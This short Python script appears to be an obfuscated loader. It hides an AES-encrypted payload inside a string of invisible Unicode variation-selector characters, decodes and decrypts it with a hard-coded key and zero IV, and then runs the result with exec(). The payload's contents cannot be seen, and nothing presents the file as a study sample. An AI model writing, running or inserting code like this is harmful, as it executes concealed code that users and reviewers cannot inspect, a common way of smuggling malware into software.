from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
carrier = "󠅠󠄌󠄔󠆶󠇌󠇙󠇘󠅥󠆧󠅅󠆭󠅛󠅅󠆼󠅇󠄒󠄶󠅜󠇬󠅋󠅼󠄾󠆿󠄬󠇜󠆆󠅅󠄍︍󠅃󠇬󠄠󠄊󠅻󠅵󠅺󠆑󠇠󠆐󠅷󠇀󠄚󠄘󠅚󠆢󠅉󠅾󠄲󠄭󠇤󠆱󠄱󠅩󠆖󠇘︀󠄥󠄋󠇠󠆍󠇯󠇑󠆂󠄈󠅴󠄣󠆖󠆆󠆛󠆩󠇦󠅆󠆶󠆖󠇔󠆿󠅉󠆣︁󠄴"
ciphertext = bytes(ord(c) - 0xFE00 if ord(c) <= 0xFE0F else ord(c) - 0xE0100 + 16 for c in carrier)
key = b'0123456789abcdef0123456789abcdef'
iv = bytes(16)
exec(unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext), 16))
